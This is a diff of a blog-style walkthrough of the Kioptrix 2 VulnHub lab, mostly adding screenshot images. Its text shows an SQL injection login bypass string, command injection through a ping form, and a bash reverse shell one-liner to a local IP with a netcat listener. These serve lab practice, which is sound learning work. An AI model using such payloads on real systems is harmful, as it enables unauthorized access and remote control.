@@ -170,10 +170,13 @@ Nmap done: 1 IP address (1 host up) scanned in 108.43 seconds
 3306/tcp open  mysql      MySQL (unauthorized)</p>
 <p>Here we see multiple ports open, finding vulnerabilities for these versions does not give useable results.
 Hence we check the port 80</p>
-<p><img src="https://github.com/somesh-bhandarkar/somesh-bhandarkar.github.io/blob/master/kioptrix-2/port80.png" alt="port80"></p>
+<p><img src="/img/vulnhub/kioptrix-2/port80.png" alt="port80"></p>
 <p>Now since, the MYSQL port is open I tried a injection in the username field,
-on entering &ldquo;check&rsquo; or 1=1 #&rdquo; the login in successful and the webpage changes to index.php.</p>
-<p>Here we can see that the page takes a user input of a IP Address and gives an output of the ping command.</p>
+on entering &ldquo;check&rsquo; or 1=1 #&rdquo; the login in successful and the webpage changes to index.php.
+<img src="/img/vulnhub/kioptrix-2/inj.png" alt="Injection">
+<img src="/img/vulnhub/kioptrix-2/after_inj.png" alt="After Inj"></p>
+<p>Here we can see that the page takes a user input of a IP Address and gives an output of the ping command.
+<img src="/img/vulnhub/kioptrix-2/ping.png" alt="Ping Command"></p>
 <h2 id="2-exploitation">2. Exploitation</h2>
 <p>But we can also execute other instructions using &ldquo;;&rdquo;
 We try the <em>whoami</em> command to check serial execution and also the user.</p>
@@ -187,6 +190,7 @@ Firstly, setup netcat to listen on port 443 using command:</p>
 <p>127.0.0.1;bash -i &gt;&amp; /dev/tcp/192.168.48.136/443 0&gt;&amp;1</p>
 </blockquote>
 <p>using the reverse tcp command to spawn BASH shell.</p>
+<p><img src="/img/vulnhub/kioptrix-2/rev.png" alt="Reverse Shell"></p>
 <p>We get output on the terminal listeneing on 443</p>
 <pre><code>nc -nvlp 443
 listening on [any] 443 ...
